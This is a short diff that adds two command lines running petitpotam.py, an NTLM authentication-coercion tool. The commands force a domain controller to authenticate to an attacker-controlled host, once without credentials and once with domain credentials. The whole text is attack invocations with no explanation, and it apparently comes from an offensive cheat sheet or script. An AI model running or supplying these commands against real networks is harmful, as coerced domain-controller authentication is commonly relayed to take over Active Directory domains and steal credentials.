@@ -1,0 +1,2 @@
+petitpotam.py "$ATTACKER_IP" "$DC_HOST"
+petitpotam.py -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$ATTACKER_IP" "$DC_HOST"
